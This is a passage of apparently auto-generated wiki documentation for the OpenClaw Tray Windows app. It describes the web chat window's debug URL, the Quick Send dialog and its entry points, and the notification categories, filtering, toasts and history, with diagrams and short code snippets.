    UseDebug["Navigate to DEBUG_TEST_URL<br/>(e.g., https://www.bing.com)"]
    BuildURL["TryBuildChatUrl()"]
    UseGateway["Navigate to gateway URL"]
    
    Navigate --> CheckDebug
    CheckDebug -->|"Yes (debugging)"| UseDebug
    CheckDebug -->|"No (production)"| BuildURL
    BuildURL --> UseGateway
```

**Configuration:**

```csharp
// Line 172 in WebChatWindow.xaml.cs
private const string? DEBUG_TEST_URL = null;
```

When set to a non-null URL (e.g., `"https://www.bing.com"`), the window navigates to that URL instead of constructing the gateway URL. This allows testing WebView2 initialization and UI without a running gateway.

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:172]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:227-249]()

## State Tracking

The window maintains minimal state to support proper cleanup and status queries.

**State Properties:**

| Property | Type | Purpose |
|----------|------|---------|
| `_gatewayUrl` | `string` | WebSocket gateway URL (readonly) |
| `_token` | `string` | Authentication token (readonly) |
| `IsClosed` | `bool` | Indicates if window has been closed |
| `_navigationCompletedHandler` | `TypedEventHandler<...>?` | Stored for cleanup |
| `_navigationStartingHandler` | `TypedEventHandler<...>?` | Stored for cleanup |

The `IsClosed` property is set to `true` in the `OnWindowClosed` handler and can be used by the tray application to track window lifecycle.

**Sources:**
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:18-24]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:25]()
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:50]()

---

# Page: Quick Send Dialog

# Quick Send Dialog

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.CommandPalette/Pages/OpenClawPage.cs](src/OpenClaw.CommandPalette/Pages/OpenClawPage.cs)
- [src/OpenClaw.Shared/OpenClawGatewayClient.cs](src/OpenClaw.Shared/OpenClawGatewayClient.cs)
- [src/OpenClaw.Tray.WinUI/App.xaml.cs](src/OpenClaw.Tray.WinUI/App.xaml.cs)
- [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs](src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs)
- [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs)
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml](src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml)
- [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs)

</details>



The Quick Send Dialog is a lightweight modal window that allows users to send quick messages to the OpenClaw AI assistant without opening the full web chat interface. It provides a keyboard-friendly, single-purpose interface optimized for rapid message entry.

For information about the web-based chat interface, see [Web Chat Window](#2.3). For details about notification handling, see [Notifications & History](#2.5).

---

## Overview and Entry Points

The Quick Send Dialog can be triggered through multiple user entry points, making it accessible regardless of how the user prefers to interact with the system.

### User Entry Points

```mermaid
graph TB
    User["User"]
    
    GlobalHotkey["Global Hotkey<br/>Ctrl+Alt+Shift+C"]
    TrayMenu["Tray Menu<br/>Quick Send item"]
    DeepLink["Deep Link<br/>openclaw://send"]
    PowerToys["PowerToys Command Palette<br/>Quick Send command"]
    
    App["App.xaml.cs<br/>ShowQuickSend()"]
    Dialog["QuickSendDialog<br/>WindowEx instance"]
    
    User -->|"Presses hotkey"| GlobalHotkey
    User -->|"Clicks menu"| TrayMenu
    User -->|"Clicks link/command"| DeepLink
    User -->|"Runs command"| PowerToys
    
    GlobalHotkey --> App
    TrayMenu --> App
    DeepLink --> App
    PowerToys --> DeepLink
    
    App -->|"Creates & shows"| Dialog
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:283-288](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:428-429](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:524](), [src/OpenClaw.CommandPalette/Pages/OpenClawPage.cs:32-36]()

### Entry Point Details

| Entry Point | Trigger | Handler | Notes |
|-------------|---------|---------|-------|
| **Global Hotkey** | `Ctrl+Alt+Shift+C` | `GlobalHotkeyService.HotkeyPressed` event → `OnGlobalHotkeyPressed()` | Registered at startup if `_settings.GlobalHotkeyEnabled` is true |
| **Tray Menu** | Click "Quick Send" menu item | `OnTrayMenuItemClicked("quicksend")` → `ShowQuickSend()` | Available in both left-click and right-click tray menus |
| **Deep Link** | `openclaw://send` protocol | `HandleDeepLink()` → `ShowQuickSend()` | Can be triggered from browser, command line, or MSIX protocol activation |
| **PowerToys** | Command Palette "Quick Send" | Opens `openclaw://send` deep link | Requires PowerToys Run extension to be installed |

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:283-288](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:524](), [src/OpenClaw.CommandPalette/Pages/OpenClawPage.cs:32-36]()

---

## Dialog Implementation

### QuickSendDialog Class

The `QuickSendDialog` class extends `WindowEx` (from WinUIEx library) and provides a simple, focused UI for message input.

```mermaid
classDiagram
    class QuickSendDialog {
        -OpenClawGatewayClient _client
        -TextBox _messageTextBox
        -Button _sendButton
        -TextBlock _statusText
        -bool _isSending
        
        +QuickSendDialog(client, prefillMessage)
        +ShowAsync()
        -OnKeyDown(sender, e)
        -OnSendClick(sender, e)
        -SendMessageAsync()
    }
    
    class WindowEx {
        <<WinUIEx>>
        +SetWindowSize(width, height)
        +CenterOnScreen()
        +SetIcon(path)
    }
    
    class OpenClawGatewayClient {
        +SendChatMessageAsync(message)
    }
    
    QuickSendDialog --|> WindowEx
    QuickSendDialog --> OpenClawGatewayClient : uses
```

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:18-148]()

### Window Configuration

The dialog is configured as a small, centered modal window with the following properties:

| Property | Value | Purpose |
|----------|-------|---------|
| **Size** | 400×200 pixels | Compact size for quick input |
| **Position** | Centered on screen | Easy to find and focus |
| **Backdrop** | `DesktopAcrylicBackdrop` | Transient dialog visual style |
| **Icon** | Status icon (connected) | Consistent with main app |
| **Auto-focus** | `_messageTextBox` | Immediate typing without clicking |

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:31-38](), [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:93]()

### UI Structure

The dialog is built programmatically using a simple `StackPanel` layout:

```
┌─────────────────────────────────────┐
│ 📤 Quick Send                       │  ← Header (SubtitleTextBlockStyle)
│                                     │
│ ┌─────────────────────────────────┐ │
│ │ Type your message...            │ │  ← TextBox (_messageTextBox)
│ └─────────────────────────────────┘ │
│                                     │
│              [Sending...] [Cancel] [Send] │  ← Status + Buttons
└─────────────────────────────────────┘
```

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:40-89]()

---

## Message Sending Flow

### Sequence Diagram

```mermaid
sequenceDiagram
    participant User
    participant Dialog as QuickSendDialog
    participant Client as OpenClawGatewayClient
    participant Gateway as OpenClaw Gateway
    participant Toast as ToastNotification
    
    User->>Dialog: Type message
    User->>Dialog: Press Enter or Click Send
    
    Dialog->>Dialog: Validate message (not empty)
    Dialog->>Dialog: Set _isSending = true
    Dialog->>Dialog: Disable controls
    Dialog->>Dialog: Update status: "Sending..."
    
    Dialog->>Client: SendChatMessageAsync(message)
    Client->>Client: Build JSON request<br/>type="req", method="chat.send"
    Client->>Gateway: WebSocket send
    
    alt Success
        Gateway-->>Client: (WebSocket ACK)
        Client-->>Dialog: Task completes
        Dialog->>Toast: Show "Message Sent" toast
        Dialog->>Dialog: Close()
    else Error
        Client-->>Dialog: Exception
        Dialog->>Dialog: Update status: "❌ Failed"
        Dialog->>Dialog: Re-enable controls
        Dialog->>Dialog: Set _isSending = false
    end
```

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:114-142](), [src/OpenClaw.Shared/OpenClawGatewayClient.cs:155-169]()

### Message Sending Logic

The `SendMessageAsync()` method implements the following flow:

1. **Validation**: Trim and check message is not empty
2. **UI Lock**: Disable controls and show "Sending..." status
3. **Gateway Call**: Invoke `_client.SendChatMessageAsync(message)`
4. **Success Handling**: 
   - Log the message
   - Show toast notification with title "Message Sent"
   - Close the dialog window
5. **Error Handling**:
   - Log the error
   - Display "❌ Failed" status text
   - Re-enable controls to allow retry

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:114-142]()

### Gateway Protocol

When `SendChatMessageAsync()` is called, the gateway client constructs a WebSocket message:

```json
{
  "type": "req",
  "id": "uuid-generated",
  "method": "chat.send",
  "params": {
    "message": "user's message text"
  }
}
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:155-169]()

---

## Keyboard Shortcuts

The dialog supports two keyboard shortcuts for efficient operation:

| Key | Action | Implementation |
|-----|--------|----------------|
| **Enter** | Send message | `OnKeyDown()` checks for `VirtualKey.Enter`, calls `SendMessageAsync()` |
| **Escape** | Cancel/close | `OnKeyDown()` checks for `VirtualKey.Escape`, calls `Close()` |

Both shortcuts only work when `_isSending` is false, preventing accidental interruption during send.

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:96-107]()

---

## Window Lifecycle

Unlike some other windows in the application (e.g., `TrayMenuWindow` which is pre-created and reused), the `QuickSendDialog` follows a create-on-demand lifecycle:

### Lifecycle Diagram

```mermaid
stateDiagram-v2
    [*] --> Created: ShowQuickSend() called
    Created --> Activated: ShowAsync() / Activate()
    Activated --> Focused: Auto-focus TextBox
    Focused --> Sending: User presses Enter/Send
    Sending --> Closed: Success
    Sending --> Focused: Error (retry)
    Focused --> Closed: User presses Escape/Cancel
    Closed --> [*]: Window disposed
```

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:26-94](), [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:132]()

### Why Not Reused?

The `QuickSendDialog` is created fresh each time because:

1. **Simplicity**: The dialog is lightweight and doesn't maintain state
2. **Rare usage**: Quick send is used less frequently than the tray menu
3. **No crash risk**: Unlike `TrayMenuWindow`, there's no evidence of window creation crashes after idle
4. **Clean state**: Each invocation starts with a blank message box (unless prefilled by deep link)

In contrast, `TrayMenuWindow` is pre-created at startup and reused to avoid window creation crashes that occur after the application has been idle.

**Sources:** [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs:79-95](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:329-335]()

---

## Prefill Message Support

The dialog supports an optional `prefillMessage` parameter in the constructor, allowing the message box to be pre-populated:

```csharp
public QuickSendDialog(OpenClawGatewayClient client, string? prefillMessage = null)
```

This enables scenarios where:
- Deep links include message content: `openclaw://send?text=hello`
- Context menus pre-fill common messages
- Other application components trigger sends with predefined text

The prefilled text is set directly in the `TextBox.Text` property during UI construction.

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:26](), [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:57]()

---

## Integration with Application State

### Connection State Dependency

The `QuickSendDialog` requires an active `OpenClawGatewayClient` instance to function. The application must ensure:

1. Gateway client is connected (status = `ConnectionStatus.Connected`)
2. Client reference is passed to the dialog constructor
3. If disconnected, send will fail with exception

The application typically checks connection state before showing the dialog in production scenarios.

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:26-28]()

### Global Hotkey Integration

The global hotkey system (see [Auto-Start & System Integration](#5.3)) registers the default hotkey `Ctrl+Alt+Shift+C` at startup:

```mermaid
graph LR
    Settings["SettingsManager<br/>GlobalHotkeyEnabled"]
    Service["GlobalHotkeyService"]
    Handler["OnGlobalHotkeyPressed()"]
    ShowMethod["ShowQuickSend()"]
    Dialog["QuickSendDialog"]
    
    Settings -->|"if enabled"| Service
    Service -->|"HotkeyPressed event"| Handler
    Handler --> ShowMethod
    ShowMethod -->|"new QuickSendDialog()"| Dialog
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:283-288]()

---

## Toast Notifications

On successful message send, the dialog displays a Windows toast notification using the `Microsoft.Toolkit.Uwp.Notifications` library:

```csharp
new ToastContentBuilder()
    .AddText("Message Sent")
    .AddText("Your message was sent to OpenClaw.")
    .Show();
```

This provides confirmation to the user even after the dialog has closed. The toast appears in the Windows notification center and follows the application's notification settings (see [Notifications & History](#2.5)).

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:128-131]()

---

## Comparison with Web Chat Window

| Feature | Quick Send Dialog | Web Chat Window |
|---------|------------------|-----------------|
| **Purpose** | Single message input | Full conversational interface |
| **UI Framework** | Programmatic WinUI controls | WebView2 (embedded browser) |
| **Size** | 400×200 pixels | 520×750 pixels (resizable) |
| **Persistence** | Closes after send | Stays open for conversation |
| **Entry Point** | Hotkey, menu, deep link | Menu, deep link |
| **Message History** | Not visible | Full chat history |
| **Response Display** | Via notifications only | Inline in chat window |
| **Offline Behavior** | Error message | Shows connection error page |

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:18-148](), [src/OpenClaw.Tray.WinUI/Windows/WebChatWindow.xaml.cs:16-284]()

---

## Error Handling

The dialog implements basic error handling for send failures:

```mermaid
graph TD
    Start["SendMessageAsync()"]
    Validate{"Message<br/>not empty?"}
    SetState["Set _isSending = true<br/>Disable controls<br/>Show 'Sending...'"]
    Send["await _client.SendChatMessageAsync()"]
    Success{"Exception?"}
    ShowToast["Show toast notification"]
    Close["Close dialog"]
    ShowError["Show '❌ Failed'<br/>Re-enable controls<br/>Set _isSending = false"]
    LogError["Logger.Error()"]
    
    Start --> Validate
    Validate -->|No| Start
    Validate -->|Yes| SetState
    SetState --> Send
    Send --> Success
    Success -->|No| ShowToast
    ShowToast --> Close
    Success -->|Yes| LogError
    LogError --> ShowError
```

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:114-142]()

### Error States

| Error Type | Detection | User Feedback | Recovery |
|-----------|-----------|---------------|----------|
| Empty message | Pre-send validation | (silent) | User can type message |
| Network/WebSocket error | Exception from `SendChatMessageAsync()` | Status text: "❌ Failed" | Controls re-enabled for retry |
| Gateway disconnected | Exception from `SendChatMessageAsync()` | Status text: "❌ Failed" | User must reconnect gateway first |

**Sources:** [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:116-117](), [src/OpenClaw.Tray.WinUI/Dialogs/QuickSendDialog.cs:134-141]()

---

# Page: Notifications & History

# Notifications & History

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Tray.WinUI/Dialogs/WelcomeDialog.cs](src/OpenClaw.Tray.WinUI/Dialogs/WelcomeDialog.cs)
- [src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs)
- [src/OpenClaw.Tray/DEVELOPMENT.md](src/OpenClaw.Tray/DEVELOPMENT.md)
- [src/OpenClaw.Tray/README.md](src/OpenClaw.Tray/README.md)
- [src/OpenClaw.Tray/TrayApplication.cs](src/OpenClaw.Tray/TrayApplication.cs)
- [tests/OpenClaw.Shared.Tests/ModelsTests.cs](tests/OpenClaw.Shared.Tests/ModelsTests.cs)

</details>



This page documents the notification system in the OpenClaw Tray application, including how notifications are received from the gateway, categorized, filtered, displayed to the user, and stored in history. For configuration of notification preferences, see [Settings Window](#5.1).

---

## Overview

The OpenClaw Tray application receives real-time notifications from the gateway over WebSocket and displays them to the user via Windows toast notifications. The system features:

- **8 notification categories** with individual filtering controls
- **Master notification toggle** to disable all notifications
- **Persistent notification history** that logs all notifications regardless of filter settings
- **Toast notification display** with fallback to balloon tips
- **Clickable notifications** that can open the dashboard or perform actions

---

## Notification Flow

```mermaid
sequenceDiagram
    participant Gateway as "OpenClaw Gateway"
    participant Client as "OpenClawGatewayClient"
    participant SyncCtx as "SynchronizationContext"
    participant TrayApp as "TrayApplication"
    participant History as "NotificationHistoryForm"
    participant Settings as "SettingsManager"
    participant Toast as "ToastNotificationManagerCompat"
    participant User as "User"

    Gateway->>Client: "chat event (notification)"
    Client->>Client: "Parse OpenClawNotification"
    Client->>SyncCtx: "Marshal to UI thread"
    SyncCtx->>TrayApp: "OnNotificationReceived(notification)"
    TrayApp->>History: "AddEntry(title, message, type)"
    Note over History: "Always logged,<br/>even if filtered"
    TrayApp->>Settings: "ShouldNotify(type)?"
    Settings-->>TrayApp: "true/false"
    
    alt "Notification allowed"
        TrayApp->>Toast: "ToastContentBuilder().Show()"
        Toast->>User: "Display Windows toast"
        User->>Toast: "Click notification"
        Toast->>TrayApp: "OnToastActivated(args)"
        TrayApp->>TrayApp: "Process action (open dashboard, etc)"
    else "Notification filtered"
        Note over TrayApp: "Skip display,<br/>already in history"
    end
    
    alt "Toast fails"
        TrayApp->>TrayApp: "ShowBalloonTip (fallback)"
    end
```

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:403-405](), [src/OpenClaw.Tray/TrayApplication.cs:472-475](), [src/OpenClaw.Tray/TrayApplication.cs:838-857](), [src/OpenClaw.Tray/TrayApplication.cs:874-877]()

The notification flow consists of these key steps:

1. **Gateway sends notification**: The OpenClaw Gateway sends a `chat` event with notification data over WebSocket
2. **Client parses notification**: `OpenClawGatewayClient` parses the event into an `OpenClawNotification` object
3. **UI thread marshaling**: The event is marshaled to the UI thread via `SynchronizationContext.Post`
4. **History logging**: The notification is **always** added to history via `NotificationHistoryForm.AddEntry`, regardless of filter settings
5. **Filter check**: `SettingsManager.ShouldNotify(type)` determines if the notification should be displayed
6. **Toast display**: If allowed, a Windows toast notification is shown; if it fails, a balloon tip is used as fallback
7. **User interaction**: Clicking the toast triggers `OnToastActivated` for further actions

---

## Notification Categories

The system supports 8 distinct notification categories, each with its own filter toggle:

| Category | Type String | Icon | Description | Example Use Case |
|----------|-------------|------|-------------|------------------|
| **Health / CGM** | `"health"` | 🩸 | Health alerts, continuous glucose monitoring | Blood glucose readings, health warnings |
| **Urgent / Error** | `"urgent"` | 🚨 | Critical alerts requiring immediate attention | System errors, security alerts |
| **Reminders** | `"reminder"` | ⏰ | Time-based reminders and scheduled alerts | Calendar reminders, task deadlines |
| **Email** | `"email"` | 📧 | Email notifications | New email arrivals, important messages |
| **Calendar** | `"calendar"` | 📅 | Calendar events and scheduling | Meeting reminders, event notifications |
| **Build / CI** | `"build"` | 🔨 | Build system and CI/CD alerts | Build failures, deployment status |
| **Stock** | `"stock"` | 📦 | Product availability notifications | In-stock alerts, price changes |
| **General Info** | `"info"` | 🤖 | General informational messages | System status, informational updates |

**Sources:** [src/OpenClaw.Tray/README.md:32-42]()

### Notification Type Detection

```mermaid
graph TB
    NotificationEvent["Notification Event<br/>(from gateway)"]
    StructuredCheck{"Has explicit<br/>type/category<br/>field?"}
    UseStructured["Use structured type<br/>(type, category, notificationType)"]
    TextAnalysis["Text-based keyword matching"]
    KeywordCheck{"Contains<br/>keywords?"}
    
    NotificationEvent --> StructuredCheck
    StructuredCheck -->|"Yes"| UseStructured
    StructuredCheck -->|"No"| TextAnalysis
    TextAnalysis --> KeywordCheck
    KeywordCheck -->|"glucose, cgm, health"| HealthType["type = 'health'"]
    KeywordCheck -->|"urgent, error, critical"| UrgentType["type = 'urgent'"]
    KeywordCheck -->|"reminder, remind me"| ReminderType["type = 'reminder'"]
    KeywordCheck -->|"email, inbox"| EmailType["type = 'email'"]
    KeywordCheck -->|"calendar, meeting"| CalendarType["type = 'calendar'"]
    KeywordCheck -->|"build, ci/cd, deploy"| BuildType["type = 'build'"]
    KeywordCheck -->|"stock, available"| StockType["type = 'stock'"]
    KeywordCheck -->|"No match"| InfoType["type = 'info' (default)"]
```

**Sources:** [src/OpenClaw.Tray/DEVELOPMENT.md:63-69]()

Notifications are classified using two methods:

1. **Structured classification** (preferred): Events with explicit `type`, `category`, or `notificationType` fields
2. **Text-based classification** (fallback): Keyword matching on notification title and message content

---

## Filtering System

### Filter Implementation

```mermaid
graph LR
    Notification["OpenClawNotification<br/>(title, message, type)"]
    MasterToggle{"Master toggle<br/>ShowNotifications"}
    TypeFilter{"Per-type filter<br/>NotifyXxx"}
    Display["Display toast<br/>notification"]
    Skip["Skip display<br/>(already in history)"]
    
    Notification --> MasterToggle
    MasterToggle -->|"false"| Skip
    MasterToggle -->|"true"| TypeFilter
    TypeFilter -->|"ShouldNotify(type) == true"| Display
    TypeFilter -->|"ShouldNotify(type) == false"| Skip
```

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:841-857]()

The filtering system uses a two-tier approach:

1. **Master toggle** (`ShowNotifications`): Global on/off switch for all notifications
2. **Per-type filters**: Individual toggles for each of the 8 notification categories

The filter check is implemented in `TrayApplication.ShowNotificationToast`:

```
// Line 841: Always log to history regardless of filter
NotificationHistoryForm.AddEntry(title, message, type);

// Line 844: Check per-type filter
if (_settings?.ShouldNotify(type) != true) return;
```

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:841-844]()

### Settings Structure

Notification preferences are stored in `%APPDATA%\OpenClawTray\settings.json`:

```json
{
  "ShowNotifications": true,
  "NotificationSound": "Default",
  "NotifyHealth": true,
  "NotifyUrgent": true,
  "NotifyReminder": true,
  "NotifyEmail": true,
  "NotifyCalendar": true,
  "NotifyBuild": true,
  "NotifyStock": true,
  "NotifyInfo": true
}
```

**Sources:** [src/OpenClaw.Tray/README.md:176-192]()

The `SettingsManager.ShouldNotify(type)` method maps notification types to the corresponding settings:

| Type | Setting Property |
|------|------------------|
| `"health"` | `NotifyHealth` |
| `"urgent"` | `NotifyUrgent` |
| `"reminder"` | `NotifyReminder` |
| `"email"` | `NotifyEmail` |
| `"calendar"` | `NotifyCalendar` |
| `"build"` | `NotifyBuild` |
| `"stock"` | `NotifyStock` |
| `"info"` (default) | `NotifyInfo` |

---

## Toast Notification Implementation

### Toast Display

```mermaid
graph TB
    ShowToast["ShowNotificationToast<br/>(title, message, type)"]
    TryToast{"Try Windows<br/>toast notification"}
    ToastSuccess["ToastContentBuilder<br/>.AddText(title)<br/>.AddText(message)<br/>.Show()"]
    ToastFail["Exception caught"]
    BalloonFallback["_notifyIcon.ShowBalloonTip<br/>(3000, title, message, ToolTipIcon.Info)"]
    UserSees["User sees<br/>notification"]
    
    ShowToast --> TryToast
    TryToast -->|"Success"| ToastSuccess
    TryToast -->|"Failure"| ToastFail
    ToastSuccess --> UserSees
    ToastFail --> BalloonFallback
    BalloonFallback --> UserSees
```

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:838-857]()

The toast notification implementation uses the `Microsoft.Toolkit.Uwp.Notifications` library with a fallback mechanism:

1. **Primary method**: Windows toast notifications via `ToastContentBuilder`
   - Modern, rich notifications with action buttons
   - Requires Windows 10 version 1903+
   - Appears in Action Center history

2. **Fallback method**: Balloon tips via `NotifyIcon.ShowBalloonTip`
   - Legacy notification style
   - Used if toast display fails (e.g., missing dependencies, older Windows)
   - 3-second display duration

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:847-856]()

### Toast Activation Handling

```mermaid
graph LR
    UserClick["User clicks<br/>toast notification"]
    ToastActivated["OnToastActivated<br/>(ToastNotificationActivatedEventArgsCompat)"]
    ParseArgs["ToastArguments.Parse<br/>(e.Argument)"]
    CheckAction{"args['action']"}
    OpenDashboard["Open dashboard<br/>with URL from<br/>args['url']"]
    DefaultAction["No action<br/>(informational toast)"]
    
    UserClick --> ToastActivated
    ToastActivated --> ParseArgs
    ParseArgs --> CheckAction
    CheckAction -->|"'openDashboard'"| OpenDashboard
    CheckAction -->|"Other/None"| DefaultAction
```

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:874-877]()

Toast activation is handled by the `OnToastActivated` event handler, which:

1. Parses toast arguments from the activation event
2. Checks for an `action` parameter
3. If action is `"openDashboard"`, opens the browser to the specified URL
4. Otherwise, treats the toast as informational-only

This enables notifications to be **clickable** and trigger specific actions, such as opening the dashboard to view details.

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:874-889]()

---

## Notification History

### History Persistence

The notification history is maintained by `NotificationHistoryForm`, which provides a persistent log of all notifications received by the application.

**Key characteristics:**

- **Always logged**: Notifications are added to history regardless of filter settings
- **Survives filtering**: Even filtered-out notifications appear in history
- **Accessible via menu**: "Notification History..." menu item opens the history window
- **Persistent across sessions**: History is maintained in memory for the application lifetime

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:121](), [src/OpenClaw.Tray/TrayApplication.cs:841]()

### History Window Access

```mermaid
graph LR
    User["User"]
    TrayIcon["Tray Icon<br/>Context Menu"]
    MenuItem["'Notification History...'<br/>menu item"]
    Handler["OnNotificationHistory<br/>event handler"]
    HistoryForm["NotificationHistoryForm<br/>.ShowDialog()"]
    HistoryUI["Scrollable list<br/>of notifications<br/>with timestamps"]
    
    User --> TrayIcon
    TrayIcon --> MenuItem
    MenuItem --> Handler
    Handler --> HistoryForm
    HistoryForm --> HistoryUI
```

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:121](), [src/OpenClaw.Tray/README.md:42-44]()

The notification history is accessed via:

1. Right-click the tray icon to open the context menu
2. Click "Notification History..." menu item
3. The `NotificationHistoryForm` dialog opens, showing a scrollable list of all notifications
4. Each entry includes timestamp, title, message, and notification type

This feature is **Windows-only** and not present in the macOS version of OpenClaw.

**Sources:** [src/OpenClaw.Tray/README.md:151]()

### History Data Structure

Each history entry contains:

| Field | Type | Description |
|-------|------|-------------|
| **Timestamp** | `DateTime` | When the notification was received |
| **Title** | `string` | Notification title/heading |
| **Message** | `string` | Notification body text |
| **Type** | `string` | Notification category (`"health"`, `"urgent"`, etc.) |

The `NotificationHistoryForm.AddEntry(title, message, type)` method is called on every notification, regardless of whether it's displayed to the user.

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:841]()

---

## Event Registration and Thread Safety

### Event Wiring

```mermaid
graph TB
    Init["InitializeAsync()"]
    CreateClient["new OpenClawGatewayClient<br/>(gatewayUrl, token, logger)"]
    RegisterEvents["Register event handlers"]
    NotifEvent["NotificationReceived += OnNotificationReceived"]
    ToastReg["ToastNotificationManagerCompat<br/>.OnActivated += OnToastActivated"]
    
    Init --> CreateClient
    CreateClient --> RegisterEvents
    RegisterEvents --> NotifEvent
    RegisterEvents --> ToastReg
    
    NotifEvent -.->|"Gateway sends notification"| NotifHandler["OnNotificationReceived<br/>(marshaled to UI thread)"]
    ToastReg -.->|"User clicks toast"| ToastHandler["OnToastActivated<br/>(parsed arguments)"]
```

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:85](), [src/OpenClaw.Tray/TrayApplication.cs:403]()

Event registration occurs during application initialization:

1. **Toast activation handler** registered early in `InitializeComponent()`:
   ```
   // Line 85
   ToastNotificationManagerCompat.OnActivated += OnToastActivated;
   ```

2. **Gateway notification handler** registered in `InitializeAsync()`:
   ```
   // Line 403
   _gatewayClient.NotificationReceived += OnNotificationReceived;
   ```

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:85](), [src/OpenClaw.Tray/TrayApplication.cs:403]()

### UI Thread Marshaling

All gateway events, including notifications, are marshaled to the UI thread to ensure thread safety:

```mermaid
graph LR
    GatewayThread["Gateway WebSocket<br/>Background Thread"]
    ClientEvent["NotificationReceived<br/>event raised"]
    SyncContext["_syncContext.Post<br/>(callback, state)"]
    UIThread["Windows Forms<br/>UI Thread"]
    UIHandler["OnNotificationReceived<br/>(on UI thread)"]
    SafeUI["Safe UI updates<br/>(toast, menu, icon)"]
    
    GatewayThread --> ClientEvent
    ClientEvent --> SyncContext
    SyncContext --> UIThread
    UIThread --> UIHandler
    UIHandler --> SafeUI
```

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:472-475]()

The `OnNotificationReceived` event handler is invoked on the UI thread:

```
// Line 472-475
private void OnNotificationReceived(object? sender, OpenClawNotification n)
{
    _syncContext?.Post(_ => ShowNotificationToast(n.Title, n.Message, n.Type), null);
}
```

This ensures that all UI operations (showing toasts, updating history, modifying menus) are thread-safe.

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:472-475]()

---

## Configuration UI

The notification filter settings are configured in the Settings window, which provides:

- **Master notification toggle**: Enable/disable all notifications
- **Per-category toggles**: Individual checkboxes for each of the 8 notification types
- **Sound selection**: Choose notification sound (Default/None/Subtle)
- **Immediate effect**: Changes apply immediately without restart

For detailed documentation of the Settings window, see [Settings Window](#5.1).

**Sources:** [src/OpenClaw.Tray/README.md:173-193]()

---

# Page: Gateway Communication

# Gateway Communication

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Shared/GatewayUrlHelper.cs](src/OpenClaw.Shared/GatewayUrlHelper.cs)
- [src/OpenClaw.Shared/Models.cs](src/OpenClaw.Shared/Models.cs)
- [src/OpenClaw.Shared/OpenClawGatewayClient.cs](src/OpenClaw.Shared/OpenClawGatewayClient.cs)
- [src/OpenClaw.Tray.WinUI/App.xaml.cs](src/OpenClaw.Tray.WinUI/App.xaml.cs)
- [src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/TrayMenuWindow.xaml.cs)
- [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs](tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs)
- [tests/OpenClaw.Shared.Tests/WindowsNodeClientTests.cs](tests/OpenClaw.Shared.Tests/WindowsNodeClientTests.cs)

</details>



